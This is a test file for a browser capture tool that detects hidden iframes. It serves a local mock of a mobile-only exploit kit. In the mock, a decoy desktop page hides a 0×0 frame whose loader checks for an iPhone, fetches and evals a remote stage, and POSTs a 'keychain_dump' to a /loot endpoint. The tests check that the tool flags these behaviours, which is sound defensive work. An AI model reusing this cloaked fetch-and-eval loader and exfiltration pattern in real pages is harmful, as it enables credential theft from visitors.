import { describe, expect, test } from "bun:test";

import { IPHONE_USER_AGENT } from "../../browser/page";
import { chromiumAvailable, launchTestChromium } from "../../browser/task/test_helpers";
import { sha256Hex } from "../../util/hash";
import { fast, firstPage } from "./test_fixture";

describe.skipIf(!chromiumAvailable)("hidden frames and the phone identity, in a real browser", () => {
	/**
	 * A mobile-only exploit kit like 92haoyun.icu (production case
	 * 377486973465530391), served locally: a decoy page that turns desktops
	 * away, a 0×0 frame whose loader acts only on an iPhone, and frames that are
	 * hidden in other ways or not at all.
	 */
	function serveExploitKit(hits: Array<{ path: string; method: string; userAgent: string }>) {
		// The beacon is what Cloudflare injects into each page it proxies: code
		// the markup loads, never a stage of the loader.
		const loader = `<html><body><script defer src="/beacon.min.js/v123" data-cf-beacon='{"token":"t"}'></script><script>
const ua = navigator.userAgent;
const version = /iPhone OS ([0-9_]+)/.exec(ua)?.[1];
if (version) {
	fetch("/pe/stage.js").then((r) => r.text()).then((code) => {
		eval(code);
		const main = document.createElement("script");
		main.src = "/pe_main.js?v=" + Date.now();
		document.head.appendChild(main);
		const kc = window.readKeychain();
		fetch("/loot", { method: "POST", body: JSON.stringify({ cmd: "keychain_dump", data: kc }) });
	});
}
</script><iframe src="/nested"></iframe></body></html>`;
		const decoy = `<html><body><main><h1>Security verification in progress</h1><p id="who"></p><button>Verify</button></main>
<iframe src="/visible" style="width:300px;height:200px;border:0"></iframe>
<iframe src="/gooll" style="position:fixed;top:0;width:0;height:0;left:-1000px;border:0"></iframe>
<iframe src="/none" style="display:none"></iframe>
<iframe src="/off" style="position:absolute;left:-5000px;width:300px;height:300px"></iframe>
<script>
const phone = navigator.userAgentData === undefined && navigator.maxTouchPoints > 0 && screen.width === 393 && /iPhone/.test(navigator.platform);
document.getElementById("who").textContent = phone ? "Opened on an iPhone." : "This site isn't available on desktop. Please scan the QR code.";
</script></body></html>`;
		const pages: Record<string, [string, string]> = {
			"/": [decoy, "text/html"],
			"/gooll": [loader, "text/html"],
			"/nested": ["<html><body>nested helper</body></html>", "text/html"],
			"/visible": ["<html><body><p>A frame the visitor sees</p></body></html>", "text/html"],
			"/none": ["<html><body>display none</body></html>", "text/html"],
			"/off": ["<html><body>far away</body></html>", "text/html"],
			// A stage is code, not a 2-byte telemetry "ok"; a real one is hundreds of KB.
			"/pe/stage.js": [`window.readKeychain = () => [];\n${"// stage padding\n".repeat(8)}`, "application/javascript"],
		};
		return Bun.serve({
			port: 0,
			fetch: (request) => {
				const { pathname } = new URL(request.url);
				hits.push({ path: pathname, method: request.method, userAgent: request.headers.get("user-agent") ?? "" });
				if (pathname === "/loot") return new Response("ok");
				const page = pages[pathname];
				return page ? new Response(page[0], { headers: { "content-type": page[1] } }) : new Response("missing", { status: 404 });
			},
		});
	}

	test("a desktop capture records every frame no visitor sees with its source, but not the visible one, and the loader's iPhone branch stays unrun", async () => {
		const hits: Array<{ path: string; method: string; userAgent: string }> = [];
		const server = serveExploitKit(hits);
		try {
			const origin = `http://127.0.0.1:${server.port}`;
			const archive = await firstPage({ url: `${origin}/` }, { ...fast, renderSettleMs: 5_000, getBrowser: () => launchTestChromium() });

			expect(archive.device).toBeUndefined();
			expect(archive.text.toString()).toContain("This site isn't available on desktop.");
			const frames = archive.hiddenFrames ?? [];
			expect(frames.map(({ ref, url, hiddenBy }) => ({ ref, url, hiddenBy }))).toEqual([
				{ ref: "frame1", url: `${origin}/gooll`, hiddenBy: "0×0 size" },
				{ ref: "frame2", url: `${origin}/nested`, hiddenBy: "inside a hidden frame (0×0 size)" },
				{ ref: "frame3", url: `${origin}/none`, hiddenBy: "display: none" },
				{ ref: "frame4", url: `${origin}/off`, hiddenBy: "positioned off-screen" },
			]);
			const gooll = frames[0]!;
			// The document as received, scripts included: the MHTML would have none of it.
			expect(gooll.source).toContain('/iPhone OS ([0-9_]+)/.exec(ua)');
			expect(gooll.sha256).toBe(sha256Hex(gooll.source));
			expect(gooll.userAgent).toContain("Windows NT 10.0");
			expect(gooll.signals).toEqual({
				platformGate: ["iPhone OS"],
				runsFetchedCode: true,
				// The nested frame's document is that frame's own, not a stage of the loader.
				stageUrls: [],
				dataUploads: [{ url: `${origin}/loot`, data: ["keychain"], observed: false }],
			});
			expect(gooll.sentRequests).toEqual([]);
			expect(hits.some(({ path }) => path === "/pe/stage.js" || path === "/loot")).toBe(false);
		} finally {
			server.stop(true);
		}
	}, 60_000);

	test("an iPhone capture is Safari on iOS 18.6.2 to the page and its server, and records the stages the loader fetched and the data it sent", async () => {
		const hits: Array<{ path: string; method: string; userAgent: string }> = [];
		const server = serveExploitKit(hits);
		try {
			const origin = `http://127.0.0.1:${server.port}`;
			const archive = await firstPage({ url: `${origin}/`, device: "iphone" }, { ...fast, renderSettleMs: 5_000, getBrowser: () => launchTestChromium() });

			expect(archive.device).toBe("iphone");
			expect(archive.text.toString()).toContain("Opened on an iPhone.");
			expect(new Set(hits.map(({ userAgent }) => userAgent))).toEqual(new Set([IPHONE_USER_AGENT]));
			expect(hits).toContainEqual({ path: "/loot", method: "POST", userAgent: IPHONE_USER_AGENT });

			const gooll = archive.hiddenFrames!.find(({ url }) => url === `${origin}/gooll`)!;
			expect(gooll.userAgent).toBe(IPHONE_USER_AGENT);
			expect(gooll.resources.map(({ url, type, status }) => ({ url, type, status }))).toContainEqual({ url: `${origin}/pe/stage.js`, type: "fetch", status: 200 });
			expect(gooll.sentRequests).toEqual([{ url: `${origin}/loot`, method: "POST", body: '{"cmd":"keychain_dump","data":[]}' }]);
			expect(gooll.signals.stageUrls).toContain(`${origin}/pe/stage.js`);
			expect(gooll.signals.dataUploads).toEqual([{ url: `${origin}/loot`, data: ["keychain"], observed: true }]);
			expect(archive.screenshotPng?.byteLength).toBeGreaterThan(0);
		} finally {
			server.stop(true);
		}
	}, 60_000);
});
